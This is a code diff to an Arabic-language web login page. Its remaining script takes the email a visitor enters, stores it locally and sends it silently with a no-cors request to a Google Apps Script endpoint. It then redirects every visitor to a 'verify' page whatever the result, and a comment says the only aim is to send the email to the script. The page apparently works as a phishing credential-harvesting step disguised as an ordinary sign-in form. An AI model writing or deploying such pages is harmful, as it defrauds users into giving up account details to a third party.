@@ -1,68 +1,23 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: sans-serif; margin: 0; display: flex; justify-content: center; background-color: #EAF0E9; min-height: 100vh; }
-        #section-2 { max-width: 400px; width: 100%; padding: 40px 20px 0 20px; }
-        .welcome-text { font-size: 26px; font-weight: bold; margin-bottom: 25px; color: #1a1a1a; text-align: right; }
-        .input-field { width: 100%; padding: 18px; margin-bottom: 20px; border: 1px solid #c8d1c7; border-radius: 12px; font-size: 18px; box-sizing: border-box; text-align: right; outline: none; background-color: #fff; }
-        .remember-container { display: flex; align-items: center; justify-content: flex-end; gap: 12px; margin-bottom: 30px; }
-        .switch { position: relative; display: inline-block; width: 50px; height: 26px; }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #bdc3bc; transition: .4s; border-radius: 34px; }
-        .slider:before { position: absolute; content: ""; height: 18px; width: 18px; right: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
-        input:checked + .slider { background-color: #2EAF4A; }
-        input:checked + .slider:before { transform: translateX(-22px); }
-        .submit-btn { width: 100%; background-color: #2EAF4A; color: white; border: none; padding: 16px; border-radius: 12px; font-size: 20px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        .submit-btn:disabled { opacity: 0.7; cursor: wait; }
-    </style>
-</head>
-<body>
-<div id="section-2">
-    <div class="welcome-text">مرحبا</div>
-    <input type="email" id="userEmail" placeholder="البريد الإلكتروني" class="input-field">
-    <div class="remember-container">
-        <span style="font-size: 16px; color: #333; font-weight: bold;">تذكر البريد الالكتروني</span>
-        <label class="switch">
-            <input type="checkbox" id="rememberMe" checked>
-            <span class="slider"></span>
-        </label>
-    </div>
-    <button id="submitBtn" onclick="handleLogin()" class="submit-btn">ولوج</button>
-</div>
-
 <script>
-    const emailField = document.getElementById('userEmail');
-    const submitBtn = document.getElementById('submitBtn');
-    const scriptURL = 'https://script.google.com/macros/s/AKfycbxy-1Z37l9ynTk10ndPsF4iu7D4I41Ag3KUwnx8KnGKf7yrGSN0IB3u3glol4daSMQCuA/exec';
-
     async function handleLogin() {
-        const email = emailField.value.trim();
+        const email = document.getElementById('userEmail').value.trim();
         if (!email) return alert("يرجى إدخال البريد");
 
-        // *** التخزين لضمان وصوله للقسم الثاني ***
-        localStorage.setItem('storedEmail', email);
+        localStorage.setItem('storedEmail', email); // تخزين الإيميل
+        const btn = document.getElementById('submitBtn');
+        btn.disabled = true;
+        btn.innerText = "جاري التحقق...";
 
-        submitBtn.disabled = true;
-        submitBtn.innerText = "جاري التحقق...";
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbxy-1Z37l9ynTk10ndPsF4iu7D4I41Ag3KUwnx8KnGKf7yrGSN0IB3u3glol4daSMQCuA/exec';
 
         try {
-            const response = await fetch(`${scriptURL}?email=${encodeURIComponent(email)}`);
-            const data = await response.json();
+            // استخدام mode: 'no-cors' لتجنب أخطاء المتصفح
+            fetch(`${scriptURL}?email=${encodeURIComponent(email)}`, { mode: 'no-cors' });
             
-            // التوجيه بناءً على الحالة
-            if (data.status === "exists") {
-                window.location.href = "login/";
-            } else {
-                window.location.href = "verify/";
-            }
+            // التوجيه فوراً (بما أننا نريد فقط إرسال الإيميل للسكريبت)
+            setTimeout(() => { window.location.href = "verify/"; }, 500);
         } catch (e) {
-            // انتقال احتياطي في حال فشل الاتصال بالسكريبت
             window.location.href = "verify/";
         }
     }
 </script>
-</body>
-</html>
